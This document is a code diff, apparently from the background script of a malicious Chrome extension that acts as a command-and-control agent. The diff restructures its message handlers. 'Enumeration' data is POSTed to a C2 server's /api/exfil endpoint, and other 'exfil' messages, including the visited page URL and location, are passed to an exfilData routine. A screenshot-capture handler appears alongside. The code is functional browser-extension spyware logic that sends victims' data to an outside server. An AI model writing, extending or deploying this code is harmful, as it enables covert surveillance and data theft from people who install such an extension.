@@ -360,7 +360,6 @@ async function registerAgent() {
     console.error("[Agent] Registration failed:", err);
   }
 }
-
 // Load agent_id on startup
 if (typeof chrome !== 'undefined' && chrome.runtime?.onStartup) {
   chrome.runtime.onStartup.addListener(() => {
@@ -381,26 +380,36 @@ if (typeof chrome !== 'undefined' && chrome.runtime?.onStartup) {
 if (typeof chrome !== 'undefined' && chrome.runtime?.onMessage) {
   chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     
-    // Handle enumeration message
-    if (message.type === 'exfil' && message.action === 'ENUMERATION') {
-      const payload = {
-        agent_id: agent_id,
-        action: message.action,
-        payload: message.data
-      };
+    if (message.type === 'exfil') {
+      if (message.action === 'ENUMERATION') {
+        const payload = {
+          agent_id: agent_id,
+          action: message.action,
+          payload: message.data
+        };
 
-      fetch(`${C2_SERVER}/api/exfil`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log('Enumeration data sent successfully:', data);
-      })
-      .catch(error => {
-        console.error('Error sending enumeration data:', error);
-      });
+        fetch(`${C2_SERVER}/api/exfil`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log('Enumeration data sent successfully:', data);
+        })
+        .catch(error => {
+          console.error('Error sending enumeration data:', error);
+        });
+
+      } else {
+        console.log('[Exfil Message]', message.data);
+        exfilData(message.data.action, {
+          url: sender.url,
+          location: message.data.location,
+          ...message.data
+        });
+        sendResponse({ status: 'ok' });
+      }
     }
 
     // Handle screenshot capture
@@ -417,17 +426,6 @@ if (typeof chrome !== 'undefined' && chrome.runtime?.onMessage) {
           location: message.location
         });
       });
-    }
-
-    // Handle general exfil
-    if (message.type === 'exfil') {
-      console.log('[Exfil Message]', message.data);
-      exfilData(message.data.action, {
-        url: sender.url,
-        location: message.data.location,
-        ...message.data
-      });
-      sendResponse({ status: 'ok' });
     }
 
     return true;
